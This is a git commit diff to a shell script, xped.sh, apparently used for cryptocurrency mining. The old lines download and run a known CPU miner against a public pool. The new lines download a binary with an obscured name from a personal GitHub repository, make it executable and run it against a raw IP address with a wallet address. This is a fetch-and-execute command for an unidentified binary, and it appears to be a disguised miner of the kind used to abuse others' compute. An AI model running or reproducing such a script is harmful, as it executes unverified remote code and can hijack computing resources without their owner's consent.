641a2149060507375b26b7abb83b503eb5eca40a
vedhagsvp <vedhag230223@gmail.com>
2026-02-08 01:47:17 +0530

    Update xped.sh

--- xped.sh
+++ xped.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/ocminer/cpuminer-opt-supr/releases/download/v1.36/cpuminer-znver5-avx512
-chmod +x cpuminer-znver5-avx512
-./cpuminer-znver5-avx512 -a xelishash -o stratum+tcp://xel.suprnova.cc:3333 -u xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c.myCPUWorker -p x
+wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/tnmtas
+chmod +x tnmtas
+./tnmtas --xel-v3 --stratum --daemon-address 72.14.177.114:8085 --wallet xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c.nsd --password x
